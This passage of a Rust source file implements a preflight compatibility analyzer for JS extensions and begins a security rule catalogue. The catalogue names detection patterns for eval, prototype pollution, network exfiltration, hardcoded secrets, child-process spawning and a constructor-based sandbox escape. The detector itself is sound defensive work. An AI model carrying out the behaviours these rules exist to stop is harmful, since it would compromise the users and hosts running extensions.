// Extension compatibility preflight analyzer (bd-k5q5.3.11)
//
// Checks an extension's source before loading to predict whether it will
// work in the Pi JS runtime. Combines:
//   - Module import scanning against known shim support levels
//   - Capability requirement detection vs current policy
//   - Forbidden/flagged pattern detection
//   - Actionable remediation suggestions
//
// Produces a structured `PreflightReport` with per-finding severity,
// an overall verdict (Pass / Warn / Fail), and human-readable remediation.

use std::collections::BTreeMap;
use std::fmt::{self, Write};
use std::path::Path;

use serde::{Deserialize, Serialize};

use crate::extensions::{CompatibilityScanner, ExtensionPolicy, PolicyDecision};

// ============================================================================
// Module support level
// ============================================================================

/// How well the Pi JS runtime supports a given module.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum ModuleSupport {
    /// Fully implemented with real behaviour.
    Real,
    /// Partially implemented — some APIs are stubs or missing.
    Partial,
    /// Exists as a stub (loads without error but does nothing useful).
    Stub,
    /// Module resolves but throws on import (e.g. `node:net`).
    ErrorThrow,
    /// Module is completely missing — import will fail at load time.
    Missing,
}

impl ModuleSupport {
    /// Severity of this support level for preflight purposes.
    #[must_use]
    pub const fn severity(self) -> FindingSeverity {
        match self {
            Self::Real => FindingSeverity::Info,
            Self::Partial | Self::Stub => FindingSeverity::Warning,
            Self::ErrorThrow | Self::Missing => FindingSeverity::Error,
        }
    }

    /// Human-readable label.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self {
            Self::Real => "fully supported",
            Self::Partial => "partially supported",
            Self::Stub => "stub only",
            Self::ErrorThrow => "throws on import",
            Self::Missing => "not available",
        }
    }
}

impl fmt::Display for ModuleSupport {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.label())
    }
}

// ============================================================================
// Finding severity and categories
// ============================================================================

/// Severity level for a preflight finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FindingSeverity {
    /// Informational — no action required.
    Info,
    /// Warning — may affect functionality but extension can still load.
    Warning,
    /// Error — likely to cause load or runtime failure.
    Error,
}

impl fmt::Display for FindingSeverity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Info => f.write_str("info"),
            Self::Warning => f.write_str("warning"),
            Self::Error => f.write_str("error"),
        }
    }
}

/// Category of a preflight finding.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum FindingCategory {
    /// Module import compatibility.
    ModuleCompat,
    /// Capability policy decision.
    CapabilityPolicy,
    /// Forbidden pattern detected.
    ForbiddenPattern,
    /// Flagged pattern detected.
    FlaggedPattern,
}

impl fmt::Display for FindingCategory {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ModuleCompat => f.write_str("module_compat"),
            Self::CapabilityPolicy => f.write_str("capability_policy"),
            Self::ForbiddenPattern => f.write_str("forbidden_pattern"),
            Self::FlaggedPattern => f.write_str("flagged_pattern"),
        }
    }
}

// ============================================================================
// Preflight finding
// ============================================================================

/// A single finding from preflight analysis.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreflightFinding {
    pub severity: FindingSeverity,
    pub category: FindingCategory,
    /// Short summary of the issue.
    pub message: String,
    /// Actionable remediation suggestion (if any).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub remediation: Option<String>,
    /// Optional file/line evidence.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file: Option<String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub line: Option<usize>,
}

// ============================================================================
// Preflight verdict
// ============================================================================

/// Overall verdict from preflight analysis.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum PreflightVerdict {
    /// Extension is expected to work without issues.
    Pass,
    /// Extension may work but some features could be degraded.
    Warn,
    /// Extension is likely to fail at load or runtime.
    Fail,
}

impl fmt::Display for PreflightVerdict {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Pass => f.write_str("PASS"),
            Self::Warn => f.write_str("WARN"),
            Self::Fail => f.write_str("FAIL"),
        }
    }
}

// ============================================================================
// Preflight report
// ============================================================================

/// Complete preflight analysis report for an extension.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PreflightReport {
    pub schema: String,
    pub extension_id: String,
    pub verdict: PreflightVerdict,
    pub confidence: ConfidenceScore,
    pub risk_banner: String,
    pub findings: Vec<PreflightFinding>,
    pub summary: PreflightSummary,
}

/// Compatibility confidence score (0..=100).
///
/// Computed from the severity distribution of findings:
/// - Each error deducts 25 points (capped at 100)
/// - Each warning deducts 10 points (capped at remaining score)
/// - Score is clamped to [0, 100]
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub struct ConfidenceScore(pub u8);

impl ConfidenceScore {
    /// Compute from error/warning counts.
    #[must_use]
    pub fn from_counts(errors: usize, warnings: usize) -> Self {
        let penalty = errors.saturating_mul(25) + warnings.saturating_mul(10);
        let score = 100_usize.saturating_sub(penalty);
        Self(u8::try_from(score.min(100)).unwrap_or(0))
    }

    /// Score value 0..=100.
    #[must_use]
    pub const fn value(self) -> u8 {
        self.0
    }

    /// Human-readable confidence label.
    #[must_use]
    pub const fn label(self) -> &'static str {
        match self.0 {
            90..=100 => "High",
            60..=89 => "Medium",
            30..=59 => "Low",
            _ => "Very Low",
        }
    }
}

impl fmt::Display for ConfidenceScore {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        write!(f, "{}% ({})", self.0, self.label())
    }
}

/// Counts by severity.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PreflightSummary {
    pub errors: usize,
    pub warnings: usize,
    pub info: usize,
}

pub const PREFLIGHT_SCHEMA: &str = "pi.ext.preflight.v1";

impl PreflightReport {
    /// Create from findings.
    #[must_use]
    pub fn from_findings(extension_id: String, findings: Vec<PreflightFinding>) -> Self {
        let mut summary = PreflightSummary::default();
        for f in &findings {
            match f.severity {
                FindingSeverity::Error => summary.errors += 1,
                FindingSeverity::Warning => summary.warnings += 1,
                FindingSeverity::Info => summary.info += 1,
            }
        }

        let verdict = if summary.errors > 0 {
            PreflightVerdict::Fail
        } else if summary.warnings > 0 {
            PreflightVerdict::Warn
        } else {
            PreflightVerdict::Pass
        };

        let confidence = ConfidenceScore::from_counts(summary.errors, summary.warnings);
        let risk_banner = risk_banner_text(verdict, confidence, &summary);

        Self {
            schema: PREFLIGHT_SCHEMA.to_string(),
            extension_id,
            verdict,
            confidence,
            risk_banner,
            findings,
            summary,
        }
    }

    /// Render a human-readable markdown report.
    #[must_use]
    pub fn render_markdown(&self) -> String {
        let mut out = String::new();
        let _ = write!(
            out,
            "# Preflight Report: {}\n\n**Verdict**: {} | **Confidence**: {}\n\n",
            self.extension_id, self.verdict, self.confidence
        );
        let _ = writeln!(out, "> {}\n", self.risk_banner);
        let _ = write!(
            out,
            "| Errors | Warnings | Info |\n|--------|----------|------|\n| {} | {} | {} |\n\n",
            self.summary.errors, self.summary.warnings, self.summary.info
        );

        if self.findings.is_empty() {
            out.push_str("No issues found. Extension is expected to work.\n");
            return out;
        }

        out.push_str("## Findings\n\n");
        for (i, f) in self.findings.iter().enumerate() {
            let icon = match f.severity {
                FindingSeverity::Error => "x",
                FindingSeverity::Warning => "!",
                FindingSeverity::Info => "i",
            };
            let _ = writeln!(
                out,
                "{}. [{}] **{}**: {}",
                i + 1,
                icon,
                f.category,
                f.message
            );
            if let Some(loc) = &f.file {
                if let Some(line) = f.line {
                    let _ = writeln!(out, "   Location: {loc}:{line}");
                } else {
                    let _ = writeln!(out, "   Location: {loc}");
                }
            }
            if let Some(rem) = &f.remediation {
                let _ = writeln!(out, "   Remediation: {rem}");
            }
            out.push('\n');
        }

        out
    }

    /// Serialize to JSON.
    ///
    /// # Errors
    ///
    /// Returns an error if serialization fails.
    pub fn to_json(&self) -> Result<String, serde_json::Error> {
        serde_json::to_string_pretty(self)
    }
}

// ============================================================================
// Known module support registry
// ============================================================================

/// Returns the known support level for a module specifier, or `None` if the
/// module is not in our registry (likely a relative import or external npm).
#[must_use]
#[allow(clippy::match_same_arms)]
pub fn known_module_support(specifier: &str) -> Option<ModuleSupport> {
    let normalized = specifier.strip_prefix("node:").unwrap_or(specifier);

    // Match on the root module name (before any slash sub-path).
    let module_root = normalized.split('/').next().unwrap_or(normalized);

    match module_root {
        // P0 — fully implemented
        "path" | "os" => Some(ModuleSupport::Real),
        "fs" => {
            // node:fs is real, node:fs/promises is partial
            if normalized == "fs/promises" {
                Some(ModuleSupport::Partial)
            } else {
                Some(ModuleSupport::Real)
            }
        }
        "child_process" => Some(ModuleSupport::Real),

        // P1 — real
        "url" | "util" | "events" | "stream" | "buffer" | "querystring" | "string_decoder"
        | "timers" => Some(ModuleSupport::Real),

        // P1 — partial
        "crypto" => Some(ModuleSupport::Partial),
        "readline" => {
            if normalized == "readline/promises" {
                Some(ModuleSupport::Missing)
            } else {
                Some(ModuleSupport::Partial)
            }
        }
        "http" | "https" => Some(ModuleSupport::Partial),

        // P2 — stubs
        "zlib"
        | "tty"
        | "assert"
        | "vm"
        | "v8"
        | "perf_hooks"
        | "worker_threads"
        | "diagnostics_channel"
        | "async_hooks" => Some(ModuleSupport::Stub),

        // P3 — error throw
        "net" | "dgram" | "dns" | "tls" | "cluster" => Some(ModuleSupport::ErrorThrow),

        // Known npm packages with real shims
        "@sinclair/typebox" | "zod" => Some(ModuleSupport::Real),

        // Known npm packages with stubs
        "chokidar" | "jsdom" | "turndown" | "beautiful-mermaid" | "node-pty" | "ws" | "axios" => {
            Some(ModuleSupport::Stub)
        }

        // @modelcontextprotocol
        "@modelcontextprotocol" => Some(ModuleSupport::Stub),

        // @mariozechner packages
        "@mariozechner" => Some(ModuleSupport::Partial),

        // @opentelemetry
        "@opentelemetry" => Some(ModuleSupport::Stub),

        _ => None,
    }
}

/// Remediation suggestion for a module at a given support level.
#[must_use]
pub fn module_remediation(specifier: &str, support: ModuleSupport) -> Option<String> {
    let normalized = specifier.strip_prefix("node:").unwrap_or(specifier);
    let module_root = normalized.split('/').next().unwrap_or(normalized);

    match (module_root, support) {
        (_, ModuleSupport::Real) => None,
        ("fs", ModuleSupport::Partial) => Some(
            "fs/promises has partial coverage. Use synchronous fs APIs (existsSync, readFileSync, writeFileSync) for best compatibility.".to_string()
        ),
        ("crypto", ModuleSupport::Partial) => Some(
            "Only createHash, randomBytes, and randomUUID are available. For other crypto ops, consider using the Web Crypto API.".to_string()
        ),
        ("readline", ModuleSupport::Partial) => Some(
            "Basic readline is available but readline/promises is not. Use callback-based readline API.".to_string()
        ),
        ("http" | "https", ModuleSupport::Partial) => Some(
            "HTTP client functionality is available via fetch(). HTTP server functionality is not supported.".to_string()
        ),
        ("net", ModuleSupport::ErrorThrow) => Some(
            "Raw TCP sockets are not available. Use fetch() for HTTP or the pi.http hostcall for network requests.".to_string()
        ),
        ("tls", ModuleSupport::ErrorThrow) => Some(
            "TLS sockets are not available. Use fetch() with HTTPS URLs instead.".to_string()
        ),
        ("dns", ModuleSupport::ErrorThrow) => Some(
            "DNS resolution is not available. Use fetch() which handles DNS internally.".to_string()
        ),
        ("dgram" | "cluster", ModuleSupport::ErrorThrow) => Some(
            format!("The `{module_root}` module is not supported in the extension runtime.")
        ),
        ("chokidar", _) => Some(
            "File watching is not supported. Consider polling with fs.existsSync or using event hooks instead.".to_string()
        ),
        ("jsdom", _) => Some(
            "DOM parsing is not available. Consider extracting text content without DOM manipulation.".to_string()
        ),
        ("ws", _) => Some(
            "WebSocket support is not available. Use fetch() for HTTP-based communication.".to_string()
        ),
        ("node-pty", _) => Some(
            "PTY support is not available. Use pi.exec() hostcall for command execution.".to_string()
        ),
        (_, ModuleSupport::Missing) => Some(
            format!("Module `{normalized}` is not available. Check if there is an alternative API in the pi extension SDK.")
        ),
        (_, ModuleSupport::Stub) => Some(
            format!("Module `{normalized}` is a stub — it loads without error but provides no real functionality.")
        ),
        _ => None,
    }
}

// ============================================================================
// Preflight analyzer
// ============================================================================

/// Analyzes an extension for compatibility before loading.
pub struct PreflightAnalyzer<'a> {
    policy: &'a ExtensionPolicy,
    extension_id: Option<&'a str>,
}

impl<'a> PreflightAnalyzer<'a> {
    /// Create a new preflight analyzer with the given policy context.
    #[must_use]
    pub const fn new(policy: &'a ExtensionPolicy, extension_id: Option<&'a str>) -> Self {
        Self {
            policy,
            extension_id,
        }
    }

    /// Run preflight analysis on an extension at the given path.
    ///
    /// The path can be a single file or a directory containing extension source.
    pub fn analyze(&self, path: &Path) -> PreflightReport {
        let ext_id = self.extension_id.unwrap_or("unknown").to_string();

        let scanner = CompatibilityScanner::new(path.to_path_buf());
        let ledger = scanner
            .scan_path(path)
            .unwrap_or_else(|_| crate::extensions::CompatLedger::empty());

        let mut findings = Vec::new();

        // 1. Check module imports for compatibility
        Self::check_module_findings(&ledger, &mut findings);

        // 2. Check capability requirements against policy
        self.check_capability_findings(&ledger, &mut findings);

        // 3. Check forbidden patterns
        Self::check_forbidden_findings(&ledger, &mut findings);

        // 4. Check flagged patterns
        Self::check_flagged_findings(&ledger, &mut findings);

        // Sort: errors first, then warnings, then info
        findings.sort_by_key(|finding| std::cmp::Reverse(finding.severity));

        PreflightReport::from_findings(ext_id, findings)
    }

    /// Analyze from raw source text (for testing or when path isn't available).
    #[must_use]
    pub fn analyze_source(&self, extension_id: &str, source: &str) -> PreflightReport {
        let mut findings = Vec::new();

        // Extract import specifiers from source
        let mut module_imports: BTreeMap<String, Vec<usize>> = BTreeMap::new();
        for (idx, line) in source.lines().enumerate() {
            let line_no = idx + 1;
            for specifier in extract_import_specifiers_simple(line) {
                module_imports.entry(specifier).or_default().push(line_no);
            }
        }

        // Check each imported module
        for (specifier, lines) in &module_imports {
            if let Some(support) = known_module_support(specifier) {
                let severity = support.severity();
                if severity > FindingSeverity::Info {
                    let remediation = module_remediation(specifier, support);
                    findings.push(PreflightFinding {
                        severity,
                        category: FindingCategory::ModuleCompat,
                        message: format!("Module `{specifier}` is {support}",),
                        remediation,
                        file: None,
                        line: lines.first().copied(),
                    });
                }
            }
        }

        // Check for capability patterns
        let mut caps_seen: BTreeMap<String, usize> = BTreeMap::new();
        for (idx, line) in source.lines().enumerate() {
            let line_no = idx + 1;
            if line.contains("process.env") && !caps_seen.contains_key("env") {
                caps_seen.insert("env".to_string(), line_no);
            }
            if (line.contains("pi.exec") || line.contains("child_process"))
                && !caps_seen.contains_key("exec")
            {
                caps_seen.insert("exec".to_string(), line_no);
            }
        }

        for (cap, line_no) in &caps_seen {
            let check = self.policy.evaluate_for(cap, self.extension_id);
            match check.decision {
                PolicyDecision::Deny => {
                    findings.push(PreflightFinding {
                        severity: FindingSeverity::Error,
                        category: FindingCategory::CapabilityPolicy,
                        message: format!(
                            "Capability `{cap}` is denied by policy (reason: {})",
                            check.reason
                        ),
                        remediation: Some(capability_remediation(cap)),
                        file: None,
                        line: Some(*line_no),
                    });
                }
                PolicyDecision::Prompt => {
                    findings.push(PreflightFinding {
                        severity: FindingSeverity::Warning,
                        category: FindingCategory::CapabilityPolicy,
                        message: format!(
                            "Capability `{cap}` will require user confirmation"
                        ),
                        remediation: Some(format!(
                            "To allow without prompting, add `{cap}` to default_caps in your extension policy config."
                        )),
                        file: None,
                        line: Some(*line_no),
                    });
                }
                PolicyDecision::Allow => {}
            }
        }

        // Sort: errors first, then warnings, then info
        findings.sort_by_key(|finding| std::cmp::Reverse(finding.severity));

        PreflightReport::from_findings(extension_id.to_string(), findings)
    }

    fn check_module_findings(
        ledger: &crate::extensions::CompatLedger,
        findings: &mut Vec<PreflightFinding>,
    ) {
        // Collect unique module specifiers from rewrites and flagged imports
        let mut seen_modules: BTreeMap<String, Option<(String, usize)>> = BTreeMap::new();

        // From rewrites — these are imports that have rewrite rules
        for rw in &ledger.rewrites {
            seen_modules
                .entry(rw.from.clone())
                .or_insert_with(|| rw.evidence.first().map(|e| (e.file.clone(), e.line)));
        }

        // From flagged unsupported imports
        for fl in &ledger.flagged {
            if fl.rule == "unsupported_import" {
                // Extract the module specifier from the message
                if let Some(spec) = extract_specifier_from_message(&fl.message) {
                    seen_modules
                        .entry(spec)
                        .or_insert_with(|| fl.evidence.first().map(|e| (e.file.clone(), e.line)));
                }
            }
        }

        for (specifier, loc) in &seen_modules {
            if let Some(support) = known_module_support(specifier) {
                let severity = support.severity();
                if severity > FindingSeverity::Info {
                    let remediation = module_remediation(specifier, support);
                    let (file, line) = loc
                        .as_ref()
                        .map_or((None, None), |(f, l)| (Some(f.clone()), Some(*l)));
                    findings.push(PreflightFinding {
                        severity,
                        category: FindingCategory::ModuleCompat,
                        message: format!("Module `{specifier}` is {support}"),
                        remediation,
                        file,
                        line,
                    });
                }
            }
        }
    }

    fn check_capability_findings(
        &self,
        ledger: &crate::extensions::CompatLedger,
        findings: &mut Vec<PreflightFinding>,
    ) {
        // Deduplicate by capability name
        let mut seen: BTreeMap<String, (String, usize)> = BTreeMap::new();

        for cap_ev in &ledger.capabilities {
            if !seen.contains_key(&cap_ev.capability) {
                let loc = cap_ev
                    .evidence
                    .first()
                    .map(|e| (e.file.clone(), e.line))
                    .unwrap_or_default();
                seen.insert(cap_ev.capability.clone(), loc);
            }
        }

        for (cap, (file, line)) in &seen {
            let check = self.policy.evaluate_for(cap, self.extension_id);
            match check.decision {
                PolicyDecision::Deny => {
                    findings.push(PreflightFinding {
                        severity: FindingSeverity::Error,
                        category: FindingCategory::CapabilityPolicy,
                        message: format!(
                            "Capability `{cap}` is denied by policy (reason: {})",
                            check.reason
                        ),
                        remediation: Some(capability_remediation(cap)),
                        file: Some(file.clone()),
                        line: Some(*line),
                    });
                }
                PolicyDecision::Prompt => {
                    findings.push(PreflightFinding {
                        severity: FindingSeverity::Warning,
                        category: FindingCategory::CapabilityPolicy,
                        message: format!(
                            "Capability `{cap}` will require user confirmation"
                        ),
                        remediation: Some(format!(
                            "To allow without prompting, add `{cap}` to default_caps in your extension policy config."
                        )),
                        file: Some(file.clone()),
                        line: Some(*line),
                    });
                }
                PolicyDecision::Allow => {}
            }
        }
    }

    fn check_forbidden_findings(
        ledger: &crate::extensions::CompatLedger,
        findings: &mut Vec<PreflightFinding>,
    ) {
        for fb in &ledger.forbidden {
            let loc = fb.evidence.first();
            findings.push(PreflightFinding {
                severity: FindingSeverity::Error,
                category: FindingCategory::ForbiddenPattern,
                message: fb.message.clone(),
                remediation: fb.remediation.clone(),
                file: loc.map(|e| e.file.clone()),
                line: loc.map(|e| e.line),
            });
        }
    }

    fn check_flagged_findings(
        ledger: &crate::extensions::CompatLedger,
        findings: &mut Vec<PreflightFinding>,
    ) {
        for fl in &ledger.flagged {
            // Skip unsupported_import — handled in check_module_findings
            if fl.rule == "unsupported_import" {
                continue;
            }
            let loc = fl.evidence.first();
            findings.push(PreflightFinding {
                severity: FindingSeverity::Warning,
                category: FindingCategory::FlaggedPattern,
                message: fl.message.clone(),
                remediation: fl.remediation.clone(),
                file: loc.map(|e| e.file.clone()),
                line: loc.map(|e| e.line),
            });
        }
    }
}

// ============================================================================
// Helpers
// ============================================================================

/// Generate a one-line risk banner for user-facing display.
fn risk_banner_text(
    verdict: PreflightVerdict,
    confidence: ConfidenceScore,
    summary: &PreflightSummary,
) -> String {
    match verdict {
        PreflightVerdict::Pass => format!("Extension is compatible (confidence: {confidence})"),
        PreflightVerdict::Warn => format!(
            "Extension may have issues: {} warning(s) (confidence: {confidence})",
            summary.warnings
        ),
        PreflightVerdict::Fail => format!(
            "Extension is likely incompatible: {} error(s), {} warning(s) (confidence: {confidence})",
            summary.errors, summary.warnings
        ),
    }
}

/// Extract module specifier from a compat scanner message like
/// "import of unsupported builtin `node:vm`".
fn extract_specifier_from_message(msg: &str) -> Option<String> {
    let start = msg.find('`')?;
    let end = msg[start + 1..].find('`')?;
    Some(msg[start + 1..start + 1 + end].to_string())
}

/// Simple import specifier extraction for source analysis.
/// Handles: import ... from "spec", require("spec"), import("spec").
fn extract_import_specifiers_simple(line: &str) -> Vec<String> {
    let mut specs = Vec::new();
    let trimmed = line.trim();

    // import ... from "spec" / import ... from 'spec' / import "spec"
    if trimmed.starts_with("import ") || trimmed.starts_with("export ") {
        if let Some(from_idx) = trimmed.find(" from ") {
            let rest = &trimmed[from_idx + 6..];
            if let Some(spec) = extract_quoted_string(rest) {
                if !spec.starts_with('.') && !spec.starts_with('/') {
                    specs.push(spec);
                }
            }
        } else if let Some(rest) = trimmed.strip_prefix("import ") {
            // Check for side-effect import: import "spec"
            if let Some(spec) = extract_quoted_string(rest) {
                if !spec.starts_with('.') && !spec.starts_with('/') {
                    specs.push(spec);
                }
            }
        }
    }

    // require("spec") / require('spec')
    let mut search = trimmed;
    while let Some(req_idx) = search.find("require(") {
        let rest = &search[req_idx + 8..];
        if let Some(spec) = extract_quoted_string(rest) {
            if !spec.starts_with('.') && !spec.starts_with('/') {
                specs.push(spec);
            }
        }
        search = &search[req_idx + 8..];
    }

    specs
}

/// Extract a single or double quoted string from the start of text.
fn extract_quoted_string(text: &str) -> Option<String> {
    let trimmed = text.trim();
    let (quote, rest) = if let Some(rest) = trimmed.strip_prefix('"') {
        ('"', rest)
    } else if let Some(rest) = trimmed.strip_prefix('\'') {
        ('\'', rest)
    } else {
        return None;
    };

    rest.find(quote).map(|end| rest[..end].to_string())
}

/// Remediation text for a denied capability.
fn capability_remediation(cap: &str) -> String {
    match cap {
        "exec" => "To enable shell command execution, use `--allow-dangerous` CLI flag or set `allow_dangerous: true` in config. This grants access to exec and env capabilities.".to_string(),
        "env" => "To enable environment variable access, use `--allow-dangerous` CLI flag or set `allow_dangerous: true` in config. Alternatively, add a per-extension override: `per_extension.\"<ext-id>\".allow = [\"env\"]`.".to_string(),
        _ => format!("Add `{cap}` to `default_caps` in your extension policy configuration."),
    }
}

// ============================================================================
// Security Risk Classification (bd-21vng, SEC-2.3)
// ============================================================================

/// Schema version for security scan reports. Bump minor on new rules, major on
/// breaking structural changes.
pub const SECURITY_SCAN_SCHEMA: &str = "pi.ext.security_scan.v1";

/// Stable rule identifiers. Each variant is a versioned detection rule whose
/// semantics are frozen once shipped. Add new variants; never rename or
/// redefine existing ones.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum SecurityRuleId {
    // ---- Critical tier ----
    /// Dynamic code execution via `eval()`.
    #[serde(rename = "SEC-EVAL-001")]
    EvalUsage,
    /// Dynamic code execution via `new Function(...)`.
    #[serde(rename = "SEC-FUNC-001")]
    NewFunctionUsage,
    /// Native module loading via `process.binding()`.
    #[serde(rename = "SEC-BIND-001")]
    ProcessBinding,
    /// Native addon loading via `process.dlopen()`.
    #[serde(rename = "SEC-DLOPEN-001")]
    ProcessDlopen,
    /// Prototype pollution via `__proto__` assignment.
    #[serde(rename = "SEC-PROTO-001")]
    ProtoPollution,
    /// `require.cache` manipulation for module hijacking.
    #[serde(rename = "SEC-RCACHE-001")]
    RequireCacheManip,

    // ---- High tier ----
    /// Hardcoded secret or API key pattern.
    #[serde(rename = "SEC-SECRET-001")]
    HardcodedSecret,
    /// Dynamic `import()` expression (runtime code loading).
    #[serde(rename = "SEC-DIMPORT-001")]
    DynamicImport,
    /// `Object.defineProperty` on global or prototype objects.
    #[serde(rename = "SEC-DEFPROP-001")]
    DefinePropertyAbuse,
    /// Network exfiltration pattern (fetch/XMLHttpRequest to constructed URL).
    #[serde(rename = "SEC-EXFIL-001")]
    NetworkExfiltration,
    /// Writes to sensitive filesystem paths.
    #[serde(rename = "SEC-FSSENS-001")]
    SensitivePathWrite,

    // ---- Medium tier ----
    /// `process.env` access for reading environment variables.
    #[serde(rename = "SEC-ENV-001")]
    ProcessEnvAccess,
    /// Timer abuse (very short-interval `setInterval`).
    #[serde(rename = "SEC-TIMER-001")]
    TimerAbuse,
    /// `Proxy` / `Reflect` interception patterns.
    #[serde(rename = "SEC-PROXY-001")]
    ProxyReflect,
    /// `with` statement usage (scope chain manipulation).
    #[serde(rename = "SEC-WITH-001")]
    WithStatement,

    // ---- Low tier ----
    /// `debugger` statement left in source.
    #[serde(rename = "SEC-DEBUG-001")]
    DebuggerStatement,
    /// `console` usage that may leak information.
    #[serde(rename = "SEC-CONSOLE-001")]
    ConsoleInfoLeak,

    // ---- Added in rulebook v2.0.0 ----

    // Critical tier:
    /// Command execution via `child_process.exec/spawn/execFile/fork`.
    #[serde(rename = "SEC-SPAWN-001")]
    ChildProcessSpawn,
    /// Sandbox escape via `constructor.constructor('return this')()`.
    #[serde(rename = "SEC-CONSTRUCTOR-001")]
    ConstructorEscape,
    /// Native addon require via `.node`/`.so`/`.dylib` file extension.
    #[serde(rename = "SEC-NATIVEMOD-001")]
    NativeModuleRequire,

    // High tier:
    /// `globalThis`/`global` property mutation (sandbox escape vector).
    #[serde(rename = "SEC-GLOBAL-001")]
    GlobalMutation,
    /// Symlink/hard-link creation for path traversal.
    #[serde(rename = "SEC-SYMLINK-001")]
    SymlinkCreation,
    /// `fs.chmod`/`fs.chown` permission elevation.
    #[serde(rename = "SEC-CHMOD-001")]
    PermissionChange,
    /// `net.createServer`/`dgram.createSocket` unauthorized listeners.
    #[serde(rename = "SEC-SOCKET-001")]
    SocketListener,
    /// `WebAssembly.instantiate`/`compile` sandbox bypass.
    #[serde(rename = "SEC-WASM-001")]
    WebAssemblyUsage,

    // Medium tier:
    /// `arguments.callee.caller` stack introspection.
    #[serde(rename = "SEC-ARGUMENTS-001")]
    ArgumentsCallerAccess,
}

impl SecurityRuleId {
    /// Short human-readable name for this rule.
    #[must_use]
    pub const fn name(self) -> &'static str {
        match self {
            Self::EvalUsage => "eval-usage",
            Self::NewFunctionUsage => "new-function-usage",
            Self::ProcessBinding => "process-binding",
            Self::ProcessDlopen => "process-dlopen",
            Self::ProtoPollution => "proto-pollution",
            Self::RequireCacheManip => "require-cache-manipulation",
            Self::HardcodedSecret => "hardcoded-secret",
            Self::DynamicImport => "dynamic-import",
            Self::DefinePropertyAbuse => "define-property-abuse",
            Self::NetworkExfiltration => "network-exfiltration",
            Self::SensitivePathWrite => "sensitive-path-write",
            Self::ProcessEnvAccess => "process-env-access",
            Self::TimerAbuse => "timer-abuse",
            Self::ProxyReflect => "proxy-reflect",
            Self::WithStatement => "with-statement",
            Self::DebuggerStatement => "debugger-statement",
            Self::ConsoleInfoLeak => "console-info-leak",
            Self::ChildProcessSpawn => "child-process-spawn",
            Self::ConstructorEscape => "constructor-escape",
            Self::NativeModuleRequire => "native-module-require",
            Self::GlobalMutation => "global-mutation",
            Self::SymlinkCreation => "symlink-creation",
            Self::PermissionChange => "permission-change",
            Self::SocketListener => "socket-listener",
            Self::WebAssemblyUsage => "webassembly-usage",
            Self::ArgumentsCallerAccess => "arguments-caller-access",
        }
    }

    /// Default risk tier for this rule.
    #[must_use]
    pub const fn default_tier(self) -> RiskTier {
        match self {
            Self::EvalUsage
            | Self::NewFunctionUsage
            | Self::ProcessBinding
            | Self::ProcessDlopen
            | Self::ProtoPollution
            | Self::RequireCacheManip
            | Self::ChildProcessSpawn
            | Self::ConstructorEscape
            | Self::NativeModuleRequire => RiskTier::Critical,

            Self::HardcodedSecret
            | Self::DynamicImport
            | Self::DefinePropertyAbuse
            | Self::NetworkExfiltration
            | Self::SensitivePathWrite
            | Self::GlobalMutation
            | Self::SymlinkCreation
            | Self::PermissionChange
            | Self::SocketListener
            | Self::WebAssemblyUsage => RiskTier::High,

            Self::ProcessEnvAccess
            | Self::TimerAbuse
            | Self::ProxyReflect
            | Self::WithStatement
            | Self::ArgumentsCallerAccess => RiskTier::Medium,

            Self::DebuggerStatement | Self::ConsoleInfoLeak => RiskTier::Low,
        }
    }
}

impl fmt::Display for SecurityRuleId {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        f.write_str(self.name())
    }
}

/// Risk tier for security findings.  Ordered from most to least severe so
/// the `Ord` derive gives the correct comparison direction.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RiskTier {
    /// Immediate block — active exploit vector.
    Critical,
    /// Likely dangerous — should block by default.
    High,
    /// Suspicious — warrants review.
    Medium,
    /// Informational risk — monitor.
    Low,
}

impl fmt::Display for RiskTier {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Critical => f.write_str("critical"),
            Self::High => f.write_str("high"),
            Self::Medium => f.write_str("medium"),
            Self::Low => f.write_str("low"),
        }
    }
}

/// A single security finding from static analysis.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityFinding {
    /// Stable rule identifier.
    pub rule_id: SecurityRuleId,
    /// Risk tier (may differ from `rule_id.default_tier()` if context
    /// modifies severity).
    pub risk_tier: RiskTier,
    /// Human-readable rationale for the finding.
    pub rationale: String,
    /// Source file path (relative to extension root).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub file: Option<String>,
    /// 1-based line number.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub line: Option<usize>,
    /// 1-based column number.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub column: Option<usize>,
    /// Matched source snippet (trimmed).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub snippet: Option<String>,
}

/// Aggregate risk classification for an extension.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SecurityScanReport {
    /// Schema version.
    pub schema: String,
    /// Extension identifier.
